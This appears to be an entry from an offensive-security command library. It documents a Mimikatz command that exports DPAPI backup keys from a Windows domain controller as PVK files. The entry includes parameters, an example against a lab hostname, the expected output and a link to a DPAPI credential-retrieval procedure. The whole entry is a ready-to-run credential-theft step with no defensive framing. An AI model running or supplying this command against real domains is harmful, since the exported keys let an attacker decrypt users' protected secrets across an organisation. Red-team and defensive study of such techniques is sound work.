---
type: command
executor: cmd
data: 'mimikatz.exe "lsadump::backupkeys /system:$_SYSTEM_NAME /export"'
platforms:
  - Windows
tags:
  - export
  - dpapi
  - mimikatz
  - domain
verified: true
validated: true
---

# mimikatz-lsadump-backupkeys-export

## Command

```cmd
mimikatz.exe "lsadump::backupkeys /system:$_SYSTEM_NAME /export"
```

## Description

Exports DPAPI backup keys from a domain controller using Mimikatz's LSADump module.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SYSTEM_NAME | Domain controller hostname (e.g., dc01.lab.local) | Yes |
| /system: | Remote system to target | Yes |
| /export | Flag to export keys as PVK files | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "lsadump::backupkeys /system:dc01.lab.local /export"
```

## Expected Output

```
BackupKeys file 'ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk' exported
Key exported successfully.
```

## Related

- [[procedures/Windows-DPAPI-Credential-Retrieval-with-Mimikatz]]
